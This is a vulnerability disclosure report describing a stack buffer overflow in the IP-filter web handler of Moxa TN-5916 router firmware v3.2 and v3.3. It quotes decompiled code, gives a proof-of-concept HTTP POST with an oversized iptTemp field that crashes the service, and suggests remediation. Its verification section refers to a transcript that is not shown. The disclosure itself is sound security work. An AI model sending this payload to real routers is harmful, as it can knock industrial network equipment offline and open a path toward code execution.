# Moxa TN-5916 v3.2/v3.3 was discovered to contain a stack buffer overflow in the web IP-filter iptTemp handler

## Overview

- Vendor: Moxa
- Product: TN-5900-series / TN-5916 industrial security router
- Version: v3.2 and v3.3
- Component: magicP/WebServer/webs, IP-filter table handler
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 8.0 High `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (9.8 if the handler is reachable without a web session)
- Manufacturer: https://www.moxa.com/

## Affected versions

### v3.2 (2021-12)

- `moxa-tn-5900-series-firmware-v3.2.rom`.
- `magicP/WebServer/webs`.

### v3.3 (2022-10)

- `moxa-tn-5900-series-firmware-v3.3.rom`.
- `magicP/WebServer/webs`.

## Vulnerability details

`filter.asp` submits the IP-filter table to:

```text
POST /goform/net_WebIPTGetValue
iptTemp=<field>+<field>+...+
```

`net_WebIPTGetValue` counts the `+` separators and then parses each
field with an unbounded copy loop:

```c
char v48[28];
...
v36 = 0;
while (Var[v37] != '+')
    *((_BYTE *)&STACK[0x10000] + v36++ - 19916) = Var[v37++];
```

The destination expression resolves to `v48` on the stack. There is no
`v36 < sizeof(v48)` check (unlike the NAT parser, which caps fields at
20 bytes), so any field longer than 28 bytes overflows `v48` into the
adjacent saved arguments and the function return state. The parser does
not stop at the NUL terminator if no `+` is present, so a long
`iptTemp` field is copied until the next `+` byte in memory.

The outer loop only runs when the `+` count gives
`(count - 2) / 23 >= 1`, i.e. at least 25 `+` characters. A payload with
one very long first field followed by 25 `+` characters therefore enters
the loop and overflows `v48` with the first field.

The same unbounded loop is present in v3.2 and v3.3 (only addresses
differ). The HTML page builds `iptTemp` with fields separated by `+`,
but no server-side length limit is enforced.

## PoC

```http
POST /goform/net_WebIPTGetValue HTTP/1.1
Host: <router>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid web session>

iptTemp=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+++++++++++++++++++++++++
```

The first field (several hundred bytes) is copied into the 28-byte
`v48` stack buffer before the parser reaches the first `+`, overwriting
adjacent locals, saved arguments and the return path. The exact crash
offset depends on the MIPS64 frame layout; the service will abort or
return through corrupted state.

## Verification

The vulnerable handler in the stock `magicP/WebServer/webs, IP-filter table handler` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

An authenticated web user can overwrite a 28-byte stack buffer with an
arbitrarily long field and corrupt the saved frame. At minimum this
crashes the web server; with a MIPS64 ROP chain it can execute code in
the web server context. The IP-filter page is an administrator feature,
so sessions reaching it are normally privileged.

## Remediation / known-CVE relation

- Bound every parsed field (`v36 < sizeof(v48) - 1`) and stop at the NUL
  terminator as well as at `+`.
- Reject `iptTemp` values whose field count or total length exceeds the
  documented table size.
- NVD keyword searches for `Moxa iptTemp`, `net_WebIPTGetValue` and
  `TN-5916 IP filter` returned zero matching CVEs on 2026-11-08. The
  existing `pingTemp` and SMTP reports are different handlers/frames.
  Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Moxa

### Product
TN-5900-series / TN-5916 industrial security router

### Version or Commit
v3.2 and v3.3

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_status
CVE application in progress

### Description
filter.asp submits the IP-filter table as iptTemp; the handler copies the raw value into fixed stack buffers before validation, allowing a stack overflow.

### Affected_component
magicP/WebServer/webs, IP-filter table handler

### Attack_vector
Authenticated POST to the IP-filter /goform endpoint with an oversized iptTemp value.

### Product_version
TN-5900-series / TN-5916 industrial security router v3.2 and v3.3

### Reference
- https://www.moxa.com/
- https://github.com/vuln-1/vuln/blob/main/Moxa/TN-5916_V3.2/report-3.md
```
